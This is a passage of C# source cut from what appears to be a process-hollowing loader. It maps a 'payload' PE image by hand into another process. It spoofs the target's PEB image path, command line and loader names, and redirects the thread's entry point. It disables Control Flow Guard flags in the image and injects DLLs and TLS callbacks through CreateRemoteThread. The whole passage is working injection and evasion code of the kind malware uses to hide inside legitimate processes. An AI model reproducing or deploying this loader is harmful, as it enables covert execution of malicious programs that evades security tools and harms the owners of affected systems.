                        entryBase + (int)entryToSizeOfImg, sizeBytes, (IntPtr)4, out _))
                        throw new Win32Exception(Marshal.GetLastWin32Error());

                    RewriteLdrName(hProcess, entryBase + (int)entryToBasename,
                                   Path.GetFileName(imagePath), is64Bit);
                    RewriteLdrName(hProcess, entryBase + (int)entryToFullname,
                                   imagePath, is64Bit);
                    return;
                }

                cur = ReadPointer(hProcess, cur, is64Bit);
            }
        }

        private void RewriteProcessParameters(
            IntPtr hProcess, IntPtr pebAddress, bool is64Bit,
            string? imagePath, string? commandLine)
        {
            int ppOffset = is64Bit ? PEB_PROCESS_PARAMS_OFFSET_X64 : PEB_PROCESS_PARAMS_OFFSET_X86;
            IntPtr pp = ReadPointer(hProcess, pebAddress + ppOffset, is64Bit);
            if (pp == IntPtr.Zero) return;

            if (imagePath != null)
                WriteUnicodeString(hProcess, pp + (is64Bit ? 0x60 : 0x38), imagePath, is64Bit);
            if (commandLine != null)
                WriteUnicodeString(hProcess, pp + (is64Bit ? 0x70 : 0x40), commandLine, is64Bit);
        }

        private void WriteUnicodeString(IntPtr hProcess, IntPtr usAddr, string value, bool is64Bit)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(value + "\0");
            IntPtr buf = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)bytes.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (buf == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

            if (!WriteProcessMemory(hProcess, buf, bytes, (IntPtr)bytes.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            int ptrSize = is64Bit ? 8 : 4;
            byte[] header = new byte[8 + ptrSize];
            BitConverter.GetBytes((ushort)(bytes.Length - 2)).CopyTo(header, 0);
            BitConverter.GetBytes((ushort)bytes.Length).CopyTo(header, 2);
            if (is64Bit) BitConverter.GetBytes(buf.ToInt64()).CopyTo(header, 8);
            else BitConverter.GetBytes(unchecked((uint)buf.ToInt64())).CopyTo(header, 4);

            if (!WriteProcessMemory(hProcess, usAddr, header, (IntPtr)header.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        #endregion

        #region Thread Context / Entry Point

        private void SetThreadEntryPoint(
            IntPtr hThread, bool targetIs64Bit, bool targetIsWow64, IntPtr entryPoint)
        {
            if (targetIs64Bit)
            {
                IntPtr raw = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
                IntPtr aligned = (IntPtr)(((long)raw + 15) & ~15L);
                try
                {
                    Marshal.Copy(new byte[CONTEXT64_SIZE], 0, aligned, CONTEXT64_SIZE);
                    Marshal.WriteInt32(aligned, CONTEXT64_FLAGS_OFFSET, unchecked((int)CONTEXT_CONTROL64));

                    if (!GetThreadContext(hThread, aligned))
                        throw new Win32Exception(Marshal.GetLastWin32Error());

                    Marshal.WriteInt64(aligned, CONTEXT64_RIP_OFFSET, entryPoint.ToInt64());

                    if (!SetThreadContext(hThread, aligned))
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                finally { Marshal.FreeHGlobal(raw); }
                return;
            }

            CONTEXT32 c32 = new CONTEXT32
            {
                ContextFlags = CONTEXT_CONTROL32,
                ExtendedRegisters = new byte[512],
            };

            bool ok = targetIsWow64
                ? Wow64GetThreadContext(hThread, ref c32)
                : GetThreadContext(hThread, ref c32);
            if (!ok) throw new Win32Exception(Marshal.GetLastWin32Error());

            c32.Eip = unchecked((uint)entryPoint.ToInt64());

            ok = targetIsWow64
                ? Wow64SetThreadContext(hThread, ref c32)
                : SetThreadContext(hThread, ref c32);
            if (!ok) throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        #endregion

        #region Local Image Construction

        private static byte[] BuildLocalImage(byte[] payload, PayloadInfo info)
        {
            if (info.SizeOfImage > MAX_IMAGE_SIZE)
                throw new InvalidDataException(
                    $"SizeOfImage {info.SizeOfImage} exceeds sanity limit {MAX_IMAGE_SIZE}.");

            byte[] image = new byte[info.SizeOfImage];

            long headersCopy = Math.Min((long)info.SizeOfHeaders, info.SizeOfImage);
            headersCopy = Math.Min(headersCopy, payload.Length);
            Array.Copy(payload, 0, image, 0, (int)headersCopy);

            foreach (var s in info.Sections)
            {
                if (s.SizeOfRawData == 0) continue;

                uint copySize = s.SizeOfRawData;
                if (s.VirtualSize > 0 && s.VirtualSize < copySize) copySize = s.VirtualSize;

                long srcEnd = (long)s.PointerToRawData + copySize;
                long dstEnd = (long)s.VirtualAddress + copySize;
                if (srcEnd > payload.Length || dstEnd > image.Length)
                    throw new InvalidDataException(
                        $"Section bounds invalid (VA=0x{s.VirtualAddress:X}, copy=0x{copySize:X}).");

                Array.Copy(payload, (int)s.PointerToRawData,
                           image, (int)s.VirtualAddress, (int)copySize);
            }
            return image;
        }

        private void InvokeTlsCallbacks(
            IntPtr hProcess, IntPtr newImageBase, byte[] image, long oldImageBase)
        {
            int e = BitConverter.ToInt32(image, 0x3C);
            int opt = e + 24;
            ushort magic = BitConverter.ToUInt16(image, opt);
            bool is64 = magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
            int dd = opt + (is64 ? 0x70 : 0x60);
            long ddLimit = (long)opt + BitConverter.ToUInt16(image, e + 4 + 16);

            if ((long)dd + IMAGE_DIRECTORY_ENTRY_TLS * 8 + 8 > ddLimit) return;

            uint tlsRva = BitConverter.ToUInt32(image, dd + IMAGE_DIRECTORY_ENTRY_TLS * 8);
            if (tlsRva == 0 || tlsRva + (is64 ? 0x28u : 0x18u) > image.Length) return;

            int addrOff = is64 ? 0x18 : 0x0C;
            long cbListVA = is64
                ? BitConverter.ToInt64(image, (int)tlsRva + addrOff)
                : BitConverter.ToInt32(image, (int)tlsRva + addrOff);
            if (cbListVA == 0) return;

            long cbListRva = cbListVA - oldImageBase;
            if (cbListRva < 0 || cbListRva >= image.Length) return;

            int step = is64 ? 8 : 4;
            long p = cbListRva;
            while (p + step <= image.Length)
            {
                long cbVA = is64
                    ? BitConverter.ToInt64(image, (int)p)
                    : BitConverter.ToInt32(image, (int)p);
                if (cbVA == 0) break;

                long cbRva = cbVA - oldImageBase;
                if (cbRva < 0 || cbRva >= image.Length) break;

                IntPtr cbAddr = new IntPtr(newImageBase.ToInt64() + cbRva);
                IntPtr hThread = CreateRemoteThread(
                    hProcess, IntPtr.Zero, IntPtr.Zero, cbAddr, newImageBase, 0, out _);
                if (hThread != IntPtr.Zero)
                {
                    WaitForSingleObject(hThread, 5000);
                    CloseHandle(hThread);
                }
                p += step;
            }
        }

        private static void ApplyRelocations(byte[] image, PayloadInfo info, long delta)
        {
            if (info.RelocRva == 0 || info.RelocSize == 0) return;

            long pos = info.RelocRva;
            long end = pos + info.RelocSize;
            if (end > image.Length) end = image.Length;

            while (pos + 8 <= end)
            {
                uint pageRva = BitConverter.ToUInt32(image, (int)pos);
                uint blockSize = BitConverter.ToUInt32(image, (int)pos + 4);
                if (blockSize < 8 || pos + blockSize > end) break;

                int count = (int)((blockSize - 8) / 2);
                for (int i = 0; i < count; i++)
                {
                    ushort e = BitConverter.ToUInt16(image, (int)pos + 8 + i * 2);
                    int type = e >> 12;
                    int ofs = e & 0x0FFF;
                    long target = (long)pageRva + ofs;

                    switch (type)
                    {
                        case 0: break;
                        case 3:
                            if (target + 4 <= image.Length)
                            {
                                uint v = BitConverter.ToUInt32(image, (int)target);
                                BitConverter.GetBytes(unchecked((uint)(v + delta)))
                                             .CopyTo(image, (int)target);
                            }
                            break;
                        case 10:
                            if (target + 8 <= image.Length)
                            {
                                ulong v = BitConverter.ToUInt64(image, (int)target);
                                BitConverter.GetBytes(unchecked((ulong)((long)v + delta)))
                                             .CopyTo(image, (int)target);
                            }
                            break;
                        default:
                            throw new InvalidDataException(
                                $"Unsupported relocation type {type} in .reloc.");
                    }
                }
                pos += blockSize;
            }
        }

        private static void DisableCfgInImage(byte[] image, PayloadInfo info)
        {
            int dd = info.DataDirectoryOffset;
            long ddLimit = (long)info.OptionalHeaderOffset
                         + BitConverter.ToUInt16(image, info.OptionalHeaderOffset - 2);
            if ((long)dd + (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG + 1) * 8 > ddLimit) return;

            uint cfgRva = BitConverter.ToUInt32(image, dd + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG * 8);
            uint cfgSize = BitConverter.ToUInt32(image, dd + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG * 8 + 4);
            if (cfgRva == 0 || (long)cfgRva + cfgSize > image.Length) return;

            int guardFlagsOff = info.Is64Bit ? 0x70 : 0x5C;
            long field = (long)cfgRva + guardFlagsOff;
            if (field + 4 > image.Length) return;

            uint flags = BitConverter.ToUInt32(image, (int)field);
            flags &= ~0x00000100u;   // IMAGE_GUARD_CF_INSTRUMENTED
            flags &= ~0x00000400u;   // IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT
            flags &= ~0x00001000u;   // IMAGE_GUARD_CF_CHECK_FUNCTION_POINTER
            BitConverter.GetBytes(flags).CopyTo(image, (int)field);
        }

        private static long ReadSecurityCookieAddress(byte[] image, PayloadInfo info)
        {
            int sizeOfOptHdr = BitConverter.ToUInt16(image, info.OptionalHeaderOffset - 2);
            long ddLimit = (long)info.OptionalHeaderOffset + sizeOfOptHdr;

            int dd = info.DataDirectoryOffset;
            if ((long)dd + (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG + 1) * 8 > ddLimit) return 0;

            uint cfgRva = BitConverter.ToUInt32(image, dd + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG * 8);
            if (cfgRva == 0) return 0;
            if ((long)cfgRva + (info.Is64Bit ? 0x60 : 0x40) > image.Length) return 0;

            int fieldOff = (int)cfgRva + (info.Is64Bit ? 0x58 : 0x3C);
            return info.Is64Bit
                ? BitConverter.ToInt64(image, fieldOff)
                : BitConverter.ToInt32(image, fieldOff);
        }

        #endregion

        #region Import Resolution

        private void ResolveImports(
            IntPtr hProcess, PROCESS_INFORMATION pi, IntPtr pebAddress,
            bool targetIs64Bit, bool targetIsWow64,
            byte[] image, PayloadInfo info, IntPtr newImageBase,
            HashSet<string> loading, Dictionary<string, ExportTable> cache)
        {
            if (info.ImportRva == 0) return;

            var modules = EnumerateModules(hProcess, pebAddress, targetIs64Bit);

            int importOff = (int)info.ImportRva;
            while (true)
            {
                if ((long)importOff + 20 > image.Length)
                    throw new InvalidDataException("Import descriptor out of range.");

                uint iltRva = BitConverter.ToUInt32(image, importOff);
                uint nameRva = BitConverter.ToUInt32(image, importOff + 12);
                uint firstThunk = BitConverter.ToUInt32(image, importOff + 16);
                if (iltRva == 0 && nameRva == 0 && firstThunk == 0) break;

                if (nameRva == 0 || (long)nameRva >= image.Length)
                    throw new InvalidDataException("Import Name RVA out of range.");

                string dllName = ReadAsciiZ(image, (int)nameRva);
                string key = dllName.ToLowerInvariant();

                if (!modules.TryGetValue(key, out IntPtr modBase))
                {
                    modBase = RemoteLoadLibrary(hProcess, pi, pebAddress,
                        targetIs64Bit, targetIsWow64, dllName, loading);
                    if (modBase == IntPtr.Zero)
                        throw new InvalidDataException($"Could not load dependency: {dllName}");
                    modules[key] = modBase;
                }

                uint thunkRva = iltRva != 0 ? iltRva : firstThunk;
                uint iatRva = firstThunk;
                int step = targetIs64Bit ? 8 : 4;

                int tOff = (int)thunkRva;
                int iOff = (int)iatRva;

                while (true)
                {
                    if ((long)tOff + step > image.Length || (long)iOff + step > image.Length)
                        throw new InvalidDataException("Thunk entry out of range.");

                    ulong thunk = targetIs64Bit
                        ? BitConverter.ToUInt64(image, tOff)
                        : BitConverter.ToUInt32(image, tOff);
                    if (thunk == 0) break;

                    bool byOrdinal = targetIs64Bit
                        ? (thunk & 0x8000000000000000UL) != 0
                        : (thunk & 0x80000000UL) != 0;

                    IntPtr addr;
                    if (byOrdinal)
                    {
                        ushort ord = (ushort)(thunk & 0xFFFF);
                        addr = ResolveExportByOrdinal(hProcess, pi, pebAddress,
                            targetIs64Bit, targetIsWow64, dllName, ord, modules, cache, loading);
                        if (addr == IntPtr.Zero)
                            throw new InvalidDataException($"Ordinal {ord} not found in {dllName}.");
                    }
                    else
                    {
                        int hintNameRva = (int)(thunk & 0x7FFFFFFFUL);
                        if ((long)hintNameRva + 2 > image.Length)
                            throw new InvalidDataException("Import hint/name out of range.");

                        string func = ReadAsciiZ(image, hintNameRva + 2);
                        addr = ResolveExport(hProcess, pi, pebAddress,
                            targetIs64Bit, targetIsWow64, dllName, func, modules, cache, loading);
                        if (addr == IntPtr.Zero)
                            throw new InvalidDataException($"Import {func} not found in {dllName}.");
                    }

                    if (targetIs64Bit)
                        BitConverter.GetBytes((ulong)addr.ToInt64()).CopyTo(image, iOff);
                    else
                        BitConverter.GetBytes(unchecked((uint)addr.ToInt64())).CopyTo(image, iOff);

                    tOff += step;
                    iOff += step;
                }

                importOff += 20;
            }
        }

        private IntPtr ResolveExport(
            IntPtr hProcess, PROCESS_INFORMATION pi, IntPtr pebAddress,
            bool targetIs64Bit, bool targetIsWow64,
            string moduleName, string funcName,
            Dictionary<string, IntPtr> modules,
            Dictionary<string, ExportTable> cache,
            HashSet<string> loading, int depth = 0)
        {
            if (depth > MAX_FORWARD_DEPTH) return IntPtr.Zero;

            string key = moduleName.ToLowerInvariant();
            if (!modules.TryGetValue(key, out IntPtr modBase))
            {
                modBase = RemoteLoadLibrary(hProcess, pi, pebAddress,
                    targetIs64Bit, targetIsWow64, moduleName, loading);
                if (modBase == IntPtr.Zero) return IntPtr.Zero;
                modules[key] = modBase;
            }

            if (!cache.TryGetValue(key, out ExportTable? table))
            {
                table = ParseExports(hProcess, modBase, targetIs64Bit);
                cache[key] = table;
            }

            if (table.ByName.TryGetValue(funcName, out IntPtr addr))
                return addr;

            if (table.ForwardedNames.TryGetValue(funcName, out string? fwd))
                return FollowForwarder(hProcess, pi, pebAddress, targetIs64Bit, targetIsWow64,
                                       fwd, modules, cache, loading, depth);
            return IntPtr.Zero;
        }

        private IntPtr ResolveExportByOrdinal(
            IntPtr hProcess, PROCESS_INFORMATION pi, IntPtr pebAddress,
            bool targetIs64Bit, bool targetIsWow64,
            string moduleName, ushort ordinal,
            Dictionary<string, IntPtr> modules,
            Dictionary<string, ExportTable> cache,
            HashSet<string> loading, int depth = 0)
        {
            if (depth > MAX_FORWARD_DEPTH) return IntPtr.Zero;

            string key = moduleName.ToLowerInvariant();
            if (!modules.TryGetValue(key, out IntPtr modBase))
            {
                modBase = RemoteLoadLibrary(hProcess, pi, pebAddress,
                    targetIs64Bit, targetIsWow64, moduleName, loading);
                if (modBase == IntPtr.Zero) return IntPtr.Zero;
                modules[key] = modBase;
            }

            if (!cache.TryGetValue(key, out ExportTable? table))
            {
                table = ParseExports(hProcess, modBase, targetIs64Bit);
                cache[key] = table;
            }

            if (table.ByOrdinal.TryGetValue(ordinal, out IntPtr addr))
                return addr;

            if (table.ForwardedOrds.TryGetValue(ordinal, out string? fwd))
                return FollowForwarder(hProcess, pi, pebAddress, targetIs64Bit, targetIsWow64,
                                       fwd, modules, cache, loading, depth);
            return IntPtr.Zero;
        }

        private IntPtr FollowForwarder(
            IntPtr hProcess, PROCESS_INFORMATION pi, IntPtr pebAddress,
            bool targetIs64Bit, bool targetIsWow64,
            string fwd, Dictionary<string, IntPtr> modules,
            Dictionary<string, ExportTable> cache,
            HashSet<string> loading, int depth)
        {
            int dot = fwd.LastIndexOf('.');
            if (dot <= 0) return IntPtr.Zero;

            string dll = fwd.Substring(0, dot);
            string func = fwd.Substring(dot + 1);
            if (!dll.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)) dll += ".dll";

            if (func.StartsWith("#"))
            {
                if (ushort.TryParse(func.AsSpan(1), out ushort ord))
                    return ResolveExportByOrdinal(hProcess, pi, pebAddress,
                        targetIs64Bit, targetIsWow64, dll, ord,
                        modules, cache, loading, depth + 1);
                return IntPtr.Zero;
            }

            return ResolveExport(hProcess, pi, pebAddress,
                targetIs64Bit, targetIsWow64, dll, func,
                modules, cache, loading, depth + 1);
        }

        private Dictionary<string, IntPtr> EnumerateModules(
            IntPtr hProcess, IntPtr pebAddress, bool is64Bit)
        {
            var result = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);

            long ldrOffset = is64Bit ? PEB_LDR_OFFSET_X64 : PEB_LDR_OFFSET_X86;
            long inMemListOffset = is64Bit ? LDR_INMEM_OFFSET_X64 : LDR_INMEM_OFFSET_X86;
            long entryToDllBase = is64Bit ? LDR_DLLBASE_OFFSET_X64 : LDR_DLLBASE_OFFSET_X86;
            long entryToName = is64Bit ? LDR_BASENAME_OFFSET_X64 : LDR_BASENAME_OFFSET_X86;
            long memLinkToEntry = is64Bit ? LDR_INMEM_TO_ENTRY_X64 : LDR_INMEM_TO_ENTRY_X86;

            IntPtr ldr = ReadPointer(hProcess, pebAddress + (int)ldrOffset, is64Bit);
            if (ldr == IntPtr.Zero) return result;

            IntPtr listHead = ldr + (int)inMemListOffset;
            IntPtr cur = ReadPointer(hProcess, listHead, is64Bit);

            int guard = 0;
            while (cur != IntPtr.Zero && cur != listHead && guard++ < 1024)
            {
                IntPtr entryBase = cur - (int)memLinkToEntry;
                IntPtr dllBase = ReadPointer(hProcess, entryBase + (int)entryToDllBase, is64Bit);
                string name = ReadUnicodeStringInTarget(hProcess,
                    entryBase + (int)entryToName, is64Bit);

                if (!string.IsNullOrEmpty(name) && dllBase != IntPtr.Zero)
                    result[name.ToLowerInvariant()] = dllBase;

                cur = ReadPointer(hProcess, cur, is64Bit);
            }
            return result;
        }

        private IntPtr RemoteLoadLibrary(
            IntPtr hProcess, PROCESS_INFORMATION pi, IntPtr pebAddress,
            bool targetIs64Bit, bool targetIsWow64, string dllName,
            HashSet<string> loading)
        {
            string key = dllName.ToLowerInvariant();
            if (!loading.Add(key)) return IntPtr.Zero;

            try
            {
                var mods = EnumerateModules(hProcess, pebAddress, targetIs64Bit);
                if (mods.TryGetValue(key, out IntPtr existing))
                    return existing;

                var cache = new Dictionary<string, ExportTable>(StringComparer.OrdinalIgnoreCase);

                IntPtr loadLib = IntPtr.Zero;
                foreach (var hostDll in new[] { "kernel32.dll", "kernelbase.dll" })
                {
                    loadLib = ResolveExport(hProcess, pi, pebAddress,
                        targetIs64Bit, targetIsWow64, hostDll, "LoadLibraryA",
                        mods, cache, loading);
                    if (loadLib != IntPtr.Zero) break;
                }
                if (loadLib == IntPtr.Zero) return IntPtr.Zero;

                byte[] nameBytes = Encoding.ASCII.GetBytes(dllName + "\0");
                IntPtr remoteStr = VirtualAllocEx(hProcess, IntPtr.Zero,
                    (IntPtr)nameBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (remoteStr == IntPtr.Zero) return IntPtr.Zero;

                try
                {
                    if (!WriteProcessMemory(hProcess, remoteStr, nameBytes,
                                            (IntPtr)nameBytes.Length, out _))
                        return IntPtr.Zero;

                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, IntPtr.Zero,
                        loadLib, remoteStr, 0, out _);
                    if (hThread == IntPtr.Zero) return IntPtr.Zero;

                    try
                    {
                        WaitForSingleObject(hThread, 10_000);
                        if (!GetExitCodeThread(hThread, out uint exitCode)) return IntPtr.Zero;
                        if (exitCode == STILL_ACTIVE || exitCode == 0) return IntPtr.Zero;
                        return new IntPtr(exitCode);
                    }
                    finally { CloseHandle(hThread); }
                }
                finally
                {
                    VirtualFreeEx(hProcess, remoteStr, IntPtr.Zero, MEM_RELEASE);
                }
            }
            finally
            {
                loading.Remove(key);
            }
        }

        private sealed class ExportTable
        {
            public Dictionary<string, IntPtr> ByName { get; } = new(StringComparer.Ordinal);
            public Dictionary<ushort, IntPtr> ByOrdinal { get; } = new();
            public Dictionary<string, string> ForwardedNames { get; } = new(StringComparer.Ordinal);
            public Dictionary<ushort, string> ForwardedOrds { get; } = new();
        }

        private ExportTable ParseExports(IntPtr hProcess, IntPtr moduleBase, bool is64Bit)
        {
            var table = new ExportTable();

            byte[] dos = new byte[0x40];
            if (!ReadProcessMemory(hProcess, moduleBase, dos, (IntPtr)dos.Length, out _))
                return table;

            int peOff = BitConverter.ToInt32(dos, 0x3C);
            byte[] nt = new byte[0x108];
            if (!ReadProcessMemory(hProcess, moduleBase + peOff, nt, (IntPtr)nt.Length, out _))
                return table;

            int optOff = 4 + 20;
            ushort magic = BitConverter.ToUInt16(nt, optOff);
            int dataDirOff = (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) ? optOff + 0x70 : optOff + 0x60;

            uint exportRva = BitConverter.ToUInt32(nt, dataDirOff + IMAGE_DIRECTORY_ENTRY_EXPORT * 8);
            uint exportSize = BitConverter.ToUInt32(nt, dataDirOff + IMAGE_DIRECTORY_ENTRY_EXPORT * 8 + 4);
            if (exportRva == 0) return table;

            byte[] expDir = new byte[40];
            if (!ReadProcessMemory(hProcess, moduleBase + (int)exportRva,
                                    expDir, (IntPtr)expDir.Length, out _))
                return table;

            uint baseOrd = BitConverter.ToUInt32(expDir, 16);
            uint numFuncs = BitConverter.ToUInt32(expDir, 20);
            uint numNames = BitConverter.ToUInt32(expDir, 24);
            uint addrFuncs = BitConverter.ToUInt32(expDir, 28);
            uint addrNames = BitConverter.ToUInt32(expDir, 32);
            uint addrOrds = BitConverter.ToUInt32(expDir, 36);

            if (numFuncs == 0 || numFuncs > MAX_EXPORTS || numNames > MAX_EXPORTS)
                return table;

            byte[] funcs = new byte[numFuncs * 4];
            if (!ReadProcessMemory(hProcess, moduleBase + (int)addrFuncs,
                                    funcs, (IntPtr)funcs.Length, out _))
                return table;

            for (uint i = 0; i < numFuncs; i++)
            {
                uint funcRva = BitConverter.ToUInt32(funcs, (int)i * 4);
                if (funcRva == 0) continue;
                ushort ord = (ushort)(baseOrd + i);

                if (funcRva >= exportRva && funcRva < exportRva + exportSize)
                {
                    string fwd = ReadAsciiZRemote(hProcess, moduleBase + (int)funcRva, MAX_FORWARDER_LEN);
                    if (fwd.Length > 0) table.ForwardedOrds[ord] = fwd;
                }
                else
                {
                    table.ByOrdinal[ord] = moduleBase + (int)funcRva;
                }
            }

            if (numNames != 0)
            {
                byte[] names = new byte[numNames * 4];
                byte[] ords = new byte[numNames * 2];
                if (ReadProcessMemory(hProcess, moduleBase + (int)addrNames, names, (IntPtr)names.Length, out _) &&
                    ReadProcessMemory(hProcess, moduleBase + (int)addrOrds, ords, (IntPtr)ords.Length, out _))
                {
                    for (uint i = 0; i < numNames; i++)
                    {
                        uint nameRva = BitConverter.ToUInt32(names, (int)(i * 4));
                        ushort idx = BitConverter.ToUInt16(ords, (int)(i * 2));
                        if (idx >= numFuncs) continue;

                        uint funcRva = BitConverter.ToUInt32(funcs, (int)idx * 4);
                        if (funcRva == 0) continue;

                        string fname = ReadAsciiZRemote(hProcess, moduleBase + (int)nameRva, MAX_FORWARDER_LEN);
                        if (fname.Length == 0) continue;

                        if (funcRva >= exportRva && funcRva < exportRva + exportSize)
                        {
                            string fwd = ReadAsciiZRemote(hProcess,
                                moduleBase + (int)funcRva, MAX_FORWARDER_LEN);
                            if (fwd.Length > 0) table.ForwardedNames[fname] = fwd;
                        }
                        else
                        {
                            table.ByName[fname] = moduleBase + (int)funcRva;
                        }
                    }
                }
            }

            return table;
        }

        #endregion

        #region Low-Level Helpers

        private IntPtr ReadPointer(IntPtr hProcess, IntPtr addr, bool is64Bit)
        {
            byte[] buf = new byte[is64Bit ? 8 : 4];
            if (!ReadProcessMemory(hProcess, addr, buf, (IntPtr)buf.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            return is64Bit
                ? new IntPtr(BitConverter.ToInt64(buf, 0))
                : new IntPtr(BitConverter.ToInt32(buf, 0));
        }

        private void WritePointer(IntPtr hProcess, IntPtr addr, IntPtr value, bool is64Bit)
        {
            byte[] buf = is64Bit
                ? BitConverter.GetBytes(value.ToInt64())
                : BitConverter.GetBytes(unchecked((uint)value.ToInt64()));
            if (!WriteProcessMemory(hProcess, addr, buf, (IntPtr)buf.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        private ushort ReadUInt16(IntPtr hProcess, IntPtr addr)
        {
            byte[] buf = new byte[2];
            if (!ReadProcessMemory(hProcess, addr, buf, (IntPtr)2, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            return BitConverter.ToUInt16(buf, 0);
        }

        private string ReadUnicodeStringInTarget(IntPtr hProcess, IntPtr usAddr, bool is64Bit)
        {
            int bufOff = is64Bit ? 8 : 4;
            ushort length = ReadUInt16(hProcess, usAddr);
            if (length == 0 || length > 0x1000) return string.Empty;

            IntPtr strBuf = ReadPointer(hProcess, usAddr + bufOff, is64Bit);
            if (strBuf == IntPtr.Zero) return string.Empty;

            byte[] buf = new byte[length];
            if (!ReadProcessMemory(hProcess, strBuf, buf, (IntPtr)length, out _))
                return string.Empty;
            return Encoding.Unicode.GetString(buf);
        }

        private string ReadAsciiZRemote(IntPtr hProcess, IntPtr addr, int maxLen)
        {
            byte[] buf = new byte[maxLen];
            if (!ReadProcessMemory(hProcess, addr, buf, (IntPtr)maxLen, out _))
                return string.Empty;
            int nul = Array.IndexOf(buf, (byte)0);
            if (nul < 0) nul = maxLen;
            return Encoding.ASCII.GetString(buf, 0, nul);
        }

        private static string ReadAsciiZ(byte[] buffer, int offset)
        {
            if (offset < 0 || offset >= buffer.Length) return string.Empty;
            int end = offset;
            while (end < buffer.Length && buffer[end] != 0) end++;
            return Encoding.ASCII.GetString(buffer, offset, end - offset);
        }

        #endregion

        #region PE Parsing

        private PayloadInfo ParsePayload(byte[] payload)
        {
            if (payload.Length < 0x40)
                throw new InvalidDataException("Payload shorter than DOS header.");

            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (e_lfanew < 0 || (long)e_lfanew + 4 + 20 > payload.Length)
                throw new InvalidDataException("e_lfanew out of range.");

            if (BitConverter.ToInt32(payload, e_lfanew) != 0x00004550)
                throw new InvalidDataException("Invalid PE signature.");

            int fileHeader = e_lfanew + 4;
            if ((long)fileHeader + 20 > payload.Length)
                throw new InvalidDataException("COFF header truncated.");

            ushort machine = BitConverter.ToUInt16(payload, fileHeader);
            ushort numberOfSections = BitConverter.ToUInt16(payload, fileHeader + 2);
            ushort sizeOfOptHeader = BitConverter.ToUInt16(payload, fileHeader + 16);

            int optHeader = fileHeader + 20;
            if ((long)optHeader + 2 > payload.Length)
                throw new InvalidDataException("Optional header truncated.");

            ushort magic = BitConverter.ToUInt16(payload, optHeader);
            bool is64 = magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
            if (!is64 && magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
                throw new InvalidDataException($"Unknown optional header magic 0x{magic:X}.");

            if ((long)optHeader + sizeOfOptHeader > payload.Length)
                throw new InvalidDataException("Optional header extends beyond payload.");

            int imageBaseOff = optHeader + (is64 ? 0x18 : 0x1C);
            if ((long)imageBaseOff + (is64 ? 8 : 4) > payload.Length)
                throw new InvalidDataException("ImageBase truncated.");
            IntPtr imageBase = is64
                ? new IntPtr(BitConverter.ToInt64(payload, imageBaseOff))
                : new IntPtr(BitConverter.ToInt32(payload, imageBaseOff));

            uint entryRva = BitConverter.ToUInt32(payload, optHeader + 0x10);
            uint sizeOfImage = BitConverter.ToUInt32(payload, optHeader + 0x38);
            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optHeader + 0x3C);

            if (sizeOfHeaders > payload.Length)
                throw new InvalidDataException("SizeOfHeaders exceeds payload length.");
            if (sizeOfHeaders > sizeOfImage)
                throw new InvalidDataException("SizeOfHeaders exceeds SizeOfImage.");
            if (sizeOfImage > MAX_IMAGE_SIZE)
                throw new InvalidDataException($"SizeOfImage {sizeOfImage} exceeds sanity limit.");

            int dataDirOff = optHeader + (is64 ? 0x70 : 0x60);
            long ddLimit = (long)optHeader + sizeOfOptHeader;
            uint relocRva = 0, relocSize = 0, importRva = 0;

            if (dataDirOff + (IMAGE_DIRECTORY_ENTRY_BASERELOC + 1) * 8 <= ddLimit)
            {
                relocRva = BitConverter.ToUInt32(payload, dataDirOff + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
                relocSize = BitConverter.ToUInt32(payload, dataDirOff + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8 + 4);
            }
            if (dataDirOff + (IMAGE_DIRECTORY_ENTRY_IMPORT + 1) * 8 <= ddLimit)
            {
                importRva = BitConverter.ToUInt32(payload, dataDirOff + IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
            }

            if (relocRva != 0 &&
                (relocRva >= sizeOfImage || (long)relocRva + relocSize > sizeOfImage))
                throw new InvalidDataException("Relocation directory out of range.");
            if (importRva != 0 && importRva >= sizeOfImage)
                throw new InvalidDataException("Import directory out of range.");

            long sectionTable = (long)optHeader + sizeOfOptHeader;
            long sectionBytes = sectionTable + (long)numberOfSections * 40;
            if (sectionBytes > payload.Length)
                throw new InvalidDataException("Section table extends beyond payload.");

            var sections = new SectionInfo[numberOfSections];
            for (int i = 0; i < numberOfSections; i++)
            {
                int off = (int)sectionTable + i * 40;
                sections[i] = new SectionInfo
                {
                    VirtualSize = BitConverter.ToUInt32(payload, off + 8),
                    VirtualAddress = BitConverter.ToUInt32(payload, off + 12),
                    SizeOfRawData = BitConverter.ToUInt32(payload, off + 16),
                    PointerToRawData = BitConverter.ToUInt32(payload, off + 20),
                };

                long rawEnd = (long)sections[i].PointerToRawData + sections[i].SizeOfRawData;
                long virtEnd = (long)sections[i].VirtualAddress + sections[i].SizeOfRawData;
                if (rawEnd > payload.Length)
                    throw new InvalidDataException($"Section {i}: raw data exceeds payload.");
                if (virtEnd > sizeOfImage)
                    throw new InvalidDataException($"Section {i}: virtual data exceeds SizeOfImage.");
            }

            return new PayloadInfo
